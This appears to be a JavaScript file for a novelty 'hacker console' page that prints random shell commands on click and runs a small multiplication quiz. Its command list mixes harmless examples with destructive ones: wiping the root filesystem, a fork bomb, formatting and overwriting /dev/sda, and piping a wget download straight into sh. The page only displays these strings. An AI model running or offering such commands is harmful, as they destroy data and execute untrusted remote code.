
var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]

var out1;
var out2;

function ranBetween(min, max) {
  return Math.round(Math.random() * (max - min) + min);
}

// # Console

function generateCommand() {
  return "<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[ranBetween(0, commands.length-1)]+"</p>";
}

function populateOuts() {
  out1 = ranBetween(1, 12);
  out2 = ranBetween(1, 12);
  $("#out1").html("<h1>" + out1 + "</h1>");
  $("#out2").html("<h1>" + out2 + "</h1>");
}

$(document).ready(function () {
  populateOuts();

  $("#console-text").on("click", function () {
    $("#console-text").append(generateCommand());
    $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);
  });

  $(document).keypress(function(e) {
    if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val())) {
      if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
        alert("You win!");
        $("#in1 > input:nth-child(1)").val("");
        populateOuts();
      } else {
        alert("You Loose!");
        $("#in1 > input:nth-child(1)").val("");
        populateOuts();
      }
    }
  });
});
